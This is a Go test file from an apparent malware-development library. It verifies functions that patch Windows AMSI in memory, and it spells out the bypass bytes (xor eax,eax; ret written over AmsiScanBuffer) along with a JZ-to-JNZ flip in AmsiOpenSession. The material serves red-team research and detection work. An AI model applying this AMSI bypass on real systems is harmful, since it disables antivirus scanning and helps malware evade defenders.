//go:build windows

package amsi

import (
	"testing"
	"unsafe"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/oioio-space/maldev/testutil"
	"github.com/oioio-space/maldev/win/api"
)

func loadAmsiOrSkip(t *testing.T) {
	t.Helper()
	if err := api.Amsi.Load(); err != nil {
		t.Skip("amsi.dll not available")
	}
}

// TestPatchScanBufferCallerMatrix tests PatchScanBuffer with all 4 Caller methods.
func TestPatchScanBufferCallerMatrix(t *testing.T) {
	testutil.RequireIntrusive(t)
	loadAmsiOrSkip(t)

	for _, c := range testutil.CallerMethods(t) {
		t.Run(c.Name, func(t *testing.T) {
			proc := api.Amsi.NewProc("AmsiScanBuffer")
			if err := proc.Find(); err != nil {
				t.Skip("AmsiScanBuffer not found")
			}
			addr := proc.Addr()

			require.NoError(t, PatchScanBuffer(c.Caller))

			patched := (*[3]byte)(unsafe.Pointer(addr))
			assert.Equal(t, byte(0x31), patched[0], "xor eax,eax (0x31)")
			assert.Equal(t, byte(0xC0), patched[1], "xor eax,eax (0xC0)")
			assert.Equal(t, byte(0xC3), patched[2], "ret (0xC3)")
		})
	}
}

// TestPatchOpenSessionCallerMatrix tests PatchOpenSession with all 4 Caller methods.
// PatchOpenSession flips a JZ (0x74) to JNZ (0x75) inside AmsiOpenSession.
func TestPatchOpenSessionCallerMatrix(t *testing.T) {
	testutil.RequireIntrusive(t)
	loadAmsiOrSkip(t)

	for _, c := range testutil.CallerMethods(t) {
		t.Run(c.Name, func(t *testing.T) {
			require.NoError(t, PatchOpenSession(c.Caller))
		})
	}
}

// TestPatchAllCallerMatrix tests PatchAll (ScanBuffer + OpenSession) with all 4 callers.
func TestPatchAllCallerMatrix(t *testing.T) {
	testutil.RequireIntrusive(t)
	loadAmsiOrSkip(t)

	for _, c := range testutil.CallerMethods(t) {
		t.Run(c.Name, func(t *testing.T) {
			require.NoError(t, PatchAll(c.Caller))

			// Verify ScanBuffer is patched (31 C0 C3).
			proc := api.Amsi.NewProc("AmsiScanBuffer")
			if err := proc.Find(); err != nil {
				t.Skip("AmsiScanBuffer not found")
			}
			patched := (*[3]byte)(unsafe.Pointer(proc.Addr()))
			assert.Equal(t, byte(0x31), patched[0])
			assert.Equal(t, byte(0xC0), patched[1])
			assert.Equal(t, byte(0xC3), patched[2])
		})
	}
}
